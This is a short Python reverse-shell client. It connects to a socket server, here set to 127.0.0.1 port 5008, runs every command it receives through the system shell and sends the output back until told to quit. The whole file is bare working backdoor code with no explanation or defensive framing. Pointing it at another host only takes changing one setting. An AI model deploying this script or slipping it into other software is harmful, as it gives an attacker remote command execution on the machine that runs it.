#!/usr/bin/env python

import socket
import os
import subprocess
import sys

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5008


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((SERVER_HOST, SERVER_PORT))



while True:
    command = s.recv(1024).decode()
    if command.lower() in ['quit', 'exit']:
        break
    try:
        result = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()
    if len(result) == 0:
        result = 'OK'.encode()
    s.send(result)

s.close()
